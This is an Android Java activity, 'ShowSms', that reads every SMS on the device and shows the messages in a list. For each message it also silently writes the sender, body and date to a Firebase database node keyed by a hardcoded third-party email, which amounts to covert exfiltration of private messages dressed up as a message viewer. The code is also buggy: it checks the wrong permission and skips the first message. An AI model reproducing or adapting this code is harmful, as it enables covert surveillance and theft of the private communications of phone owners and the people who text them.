package com.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.jetbrains.annotations.NotNull;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class ShowSms extends AppCompatActivity {
private RecyclerView recyclerView;
public ArrayList<Smsmodel> smsmodelArrayList  ;
public SmsAdapter showsms;
public Smsmodel smsmodel;
String mail="obaidkhan317@gmailacom";
 int index= 0;
 String address,message,date ;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_show_sms);
        recyclerView = (RecyclerView) findViewById(R.id.rview);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        smsmodelArrayList = new ArrayList<>();
        showsms = new SmsAdapter(this, smsmodelArrayList);
        recyclerView.setAdapter(showsms);
        checkPermission();
             }

    private void checkPermission() {
        //check condition
        if(ContextCompat.checkSelfPermission( this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
            //when permission is not granted
            //grand permission
            ActivityCompat.requestPermissions( this,new String[]{Manifest.permission.READ_SMS},100);
        }
        else{
            //when permission is granted
            //create method
            getMessagesList();
        }

    }
    public void getMessagesList(){
        Uri uriSms = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);

        cursor.moveToFirst();
        while  (cursor.moveToNext())
        {
            index++;
            address = cursor.getString(1);
            message = cursor.getString(3);
            SimpleDateFormat dateFormatter = new SimpleDateFormat("dd MMM yyyy");
            String    date = dateFormatter.format(new Date(Long.parseLong((cursor.getString(2)).toString())));

            smsmodel = new Smsmodel(address,message,date);
            smsmodelArrayList.add(smsmodel);

           SendDataToServer(smsmodel);
        }
        showsms.notifyDataSetChanged();
    }
    public void onRequestPermissionsResult(int requestCode, @NonNull @NotNull String[] permissions, @NonNull @NotNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //check condition
        if(requestCode==100 && grantResults.length>0 &&grantResults[0]==PackageManager.PERMISSION_GRANTED){
            //when permission is granted
            //call method
            getMessagesList();
        }
        else{
            //when permission is denied
            //display toast
            Toast.makeText( this,"Permission denied.",Toast.LENGTH_SHORT).show();
            //call check permission method
            checkPermission();
        }
    }
    private void SendDataToServer(Smsmodel callLogItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(getEmail())
                .child("Messages").child(String.valueOf(index));
        myRef.setValue(callLogItem);


    }

    public String getEmail() {

        if(mail.contains(".")){
            mail=mail.replace(".","a");
        }
        if(mail.contains("#")){
            mail=mail.replaceAll("#","h");
        } if(mail.contains("$")){
            mail=mail.replaceAll("$","d");
        }
        return mail;
    }
    private String DurationFormat(String duration) {
        String durationFormatted=null;
        if(Integer.parseInt(duration) < 60){
            durationFormatted = duration+" sec";
        }
        else{
            int min = Integer.parseInt(duration)/60;
            int sec = Integer.parseInt(duration)%60;

            if(sec==0)
                durationFormatted = min + " min" ;
            else
                durationFormatted = min + " min " + sec + " sec";

        }
        return durationFormatted;
    }

}